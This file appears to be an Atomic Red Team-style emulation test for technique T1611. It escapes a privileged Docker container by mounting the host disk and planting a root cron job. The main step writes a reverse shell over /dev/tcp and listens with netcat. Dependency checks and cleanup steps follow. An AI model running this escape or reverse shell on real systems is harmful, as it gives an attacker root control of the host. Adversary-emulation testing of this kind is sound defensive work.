{
  "id": "6c499943-b098-4bc6-8d38-0956fc182984",
  "name": "Mount host filesystem to escape privileged Docker container",
  "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
  "platforms": [
    "containers"
  ],
  "steps": [
    {
      "id": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" \u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" \u003e\u0026 /dev/tcp/#{listen_address}/#{listen_port} 0\u003e\u00261'\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2\u003e\u00261\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "e111ff2c-9142-48f8-9134-0ca0a62a9414",
      "type": "execute-command",
      "data": {
        "command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "ac898dac-1866-4ffd-9de8-edd6f3cd2624",
      "name": "Check dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "which mount\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "fbdb5ade-4369-4ea7-a941-61f2479fb729",
      "name": "Resolve dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "ae33b85c-b44e-416b-97bb-2140eab6b3cf",
      "name": "Re-check dependency 1/5",
      "description": "Verify mount is installed.",
      "type": "execute-command",
      "data": {
        "command": "which mount\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "242aa1a1-c19e-44cc-b27a-48002eae7be9",
      "name": "Check dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "capsh --print | grep cap_sys_admin\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "a5d227a4-8482-44a3-8af1-e163525fa660",
      "name": "Resolve dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d4f1e21c-9464-4f6a-845c-8bb663249207",
      "name": "Re-check dependency 2/5",
      "description": "Verify container is privileged.",
      "type": "execute-command",
      "data": {
        "command": "capsh --print | grep cap_sys_admin\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7cc8cfba-4458-47f7-a817-e0d14cdc82c9",
      "name": "Check dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "ls #{mount_device}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3abfa503-ec8b-4253-beaa-0a1972e55cf4",
      "name": "Resolve dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5b854789-ac8d-471c-a60e-74de5fdb3a07",
      "name": "Re-check dependency 3/5",
      "description": "Verify mount device (/dev/dm-0) exists.",
      "type": "execute-command",
      "data": {
        "command": "ls #{mount_device}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7e13835a-b766-4ea4-9c99-ea174d7ae7ff",
      "name": "Check dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "which netcat\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0629f0b5-cb01-4b20-932b-f5ea3b2cec28",
      "name": "Resolve dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "901223fa-61a5-425b-a5f4-29e8871937a5",
      "name": "Re-check dependency 4/5",
      "description": "Netcat is installed.",
      "type": "execute-command",
      "data": {
        "command": "which netcat\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b50dafd3-31e1-4a1e-95ac-0c288c3cecf0",
      "name": "Check dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "2be2860a-fbfd-45ed-aed2-9913f228a1c1",
      "name": "Resolve dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0d480771-d43e-46c7-9701-146296a96382",
      "name": "Re-check dependency 5/5",
      "description": "IP Address is known.",
      "type": "execute-command",
      "data": {
        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82",
      "p": "on-success",
      "o": "e111ff2c-9142-48f8-9134-0ca0a62a9414"
    },
    {
      "s": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82",
      "p": "on-failure",
      "o": "e111ff2c-9142-48f8-9134-0ca0a62a9414"
    },
    {
      "s": "ac898dac-1866-4ffd-9de8-edd6f3cd2624",
      "p": "on-success",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "ac898dac-1866-4ffd-9de8-edd6f3cd2624",
      "p": "on-failure",
      "o": "fbdb5ade-4369-4ea7-a941-61f2479fb729"
    },
    {
      "s": "fbdb5ade-4369-4ea7-a941-61f2479fb729",
      "p": "on-success",
      "o": "ae33b85c-b44e-416b-97bb-2140eab6b3cf"
    },
    {
      "s": "ae33b85c-b44e-416b-97bb-2140eab6b3cf",
      "p": "on-failure",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "242aa1a1-c19e-44cc-b27a-48002eae7be9",
      "p": "on-success",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "242aa1a1-c19e-44cc-b27a-48002eae7be9",
      "p": "on-failure",
      "o": "a5d227a4-8482-44a3-8af1-e163525fa660"
    },
    {
      "s": "a5d227a4-8482-44a3-8af1-e163525fa660",
      "p": "on-success",
      "o": "d4f1e21c-9464-4f6a-845c-8bb663249207"
    },
    {
      "s": "d4f1e21c-9464-4f6a-845c-8bb663249207",
      "p": "on-failure",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "7cc8cfba-4458-47f7-a817-e0d14cdc82c9",
      "p": "on-success",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "7cc8cfba-4458-47f7-a817-e0d14cdc82c9",
      "p": "on-failure",
      "o": "3abfa503-ec8b-4253-beaa-0a1972e55cf4"
    },
    {
      "s": "3abfa503-ec8b-4253-beaa-0a1972e55cf4",
      "p": "on-success",
      "o": "5b854789-ac8d-471c-a60e-74de5fdb3a07"
    },
    {
      "s": "5b854789-ac8d-471c-a60e-74de5fdb3a07",
      "p": "on-failure",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "7e13835a-b766-4ea4-9c99-ea174d7ae7ff",
      "p": "on-success",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "7e13835a-b766-4ea4-9c99-ea174d7ae7ff",
      "p": "on-failure",
      "o": "0629f0b5-cb01-4b20-932b-f5ea3b2cec28"
    },
    {
      "s": "0629f0b5-cb01-4b20-932b-f5ea3b2cec28",
      "p": "on-success",
      "o": "901223fa-61a5-425b-a5f4-29e8871937a5"
    },
    {
      "s": "901223fa-61a5-425b-a5f4-29e8871937a5",
      "p": "on-failure",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "b50dafd3-31e1-4a1e-95ac-0c288c3cecf0",
      "p": "on-success",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    },
    {
      "s": "b50dafd3-31e1-4a1e-95ac-0c288c3cecf0",
      "p": "on-failure",
      "o": "2be2860a-fbfd-45ed-aed2-9913f228a1c1"
    },
    {
      "s": "2be2860a-fbfd-45ed-aed2-9913f228a1c1",
      "p": "on-success",
      "o": "0d480771-d43e-46c7-9701-146296a96382"
    },
    {
      "s": "0d480771-d43e-46c7-9701-146296a96382",
      "p": "on-failure",
      "o": "24b11d7d-0e14-454f-a5ba-bcc64ea43f82"
    }
  ],
  "tags": [
    "T1611",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "cron_filename",
      "type": "string",
      "description": "Filename of the cron job in cron_path",
      "value": "T1611_002"
    },
    {
      "name": "listen_address",
      "type": "string",
      "description": "IP address to listen for callback from the host system.",
      "value": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
    },
    {
      "name": "listen_port",
      "type": "integer",
      "description": "TCP Port to listen on for callback from the host system.",
      "value": "4444"
    },
    {
      "name": "mount_device",
      "type": "path",
      "description": "Path to the device of the host's disk to mount",
      "value": "/dev/dm-0"
    },
    {
      "name": "mount_point",
      "type": "path",
      "description": "Path where the host filesystem will be mounted",
      "value": "/mnt/T1611.002"
    },
    {
      "name": "cron_path",
      "type": "path",
      "description": "Path on the host filesystem where cron jobs are stored",
      "value": "/etc/cron.d"
    }
  ]
}